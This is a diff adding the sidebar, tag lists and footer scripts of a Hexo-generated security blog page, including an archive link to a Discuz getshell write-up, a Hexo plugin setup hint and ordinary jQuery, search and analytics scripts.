+            <span class="archive-post-date">07/01</span><a class="archive-post-title" href= "/2016/07/01/Discuz 3.2 利用ssrf+缓存应用getshell漏洞（附pocsuite）/" >Discuz 3.2 利用ssrf+缓存应用getshell漏洞（附pocsuite）</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="黑产研究"><span class="iconfont-archer">&#xe606;</span>黑产研究</span>
+    
+        <span class="sidebar-tag-name" data-tags="BlackHat SEO"><span class="iconfont-archer">&#xe606;</span>BlackHat SEO</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="安全研究"><span class="iconfont-archer">&#xe606;</span>安全研究</span>
+    
+        <span class="sidebar-tag-name" data-tags="Joomla"><span class="iconfont-archer">&#xe606;</span>Joomla</span>
+    
+        <span class="sidebar-tag-name" data-tags="Git"><span class="iconfont-archer">&#xe606;</span>Git</span>
+    
+        <span class="sidebar-tag-name" data-tags="环境部署"><span class="iconfont-archer">&#xe606;</span>环境部署</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="blockchain"><span class="iconfont-archer">&#xe606;</span>blockchain</span>
+    
+        <span class="sidebar-tag-name" data-tags="薅羊毛"><span class="iconfont-archer">&#xe606;</span>薅羊毛</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="黑产研究"><span class="iconfont-archer">&#xe60a;</span>黑产研究</span>
+    
+        <span class="sidebar-category-name" data-categories="漏洞分析"><span class="iconfont-archer">&#xe60a;</span>漏洞分析</span>
+    
+        <span class="sidebar-category-name" data-categories="安全研究"><span class="iconfont-archer">&#xe60a;</span>安全研究</span>
+    
+        <span class="sidebar-category-name" data-categories="环境部署"><span class="iconfont-archer">&#xe60a;</span>环境部署</span>
+    
+        <span class="sidebar-category-name" data-categories="一些思路"><span class="iconfont-archer">&#xe60a;</span>一些思路</span>
+    
+        <span class="sidebar-category-name" data-categories="blockchain"><span class="iconfont-archer">&#xe60a;</span>blockchain</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Lucifaer"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+        <div class="site-search">
+  <div class="algolia-popup popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="iconfont-archer">&#xe609;</i>
+    </span>
+  </div>
+</div>
+        <script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.8.0/dist/instantsearch.min.js" defer></script>
+        <script src="/scripts/search.js" defer></script>
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
